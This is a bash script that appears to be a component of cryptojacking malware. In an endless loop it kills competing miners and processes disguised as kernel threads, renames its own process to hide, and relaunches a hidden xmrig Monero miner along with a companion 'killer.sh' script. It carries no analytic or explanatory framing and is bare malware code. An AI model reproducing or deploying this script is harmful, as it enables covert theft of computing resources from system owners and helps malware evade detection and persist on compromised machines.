#!/bin/bash
while true; do
  pkill -f xmrig
  pkill -f minerd
  pkill -f kworker
  pkill -f kthreadd
  echo "texniaz" > /proc/$$/comm
  if ! pgrep -f xmrig; then
    nohup $folder/xmrig-$xmrver/xmrig > /dev/null 2>&1 &
  fi
  if ! pgrep -f killer.sh; then
    nohup $folder/killer.sh > /dev/null 2>&1 &
  fi
  sleep 10
done
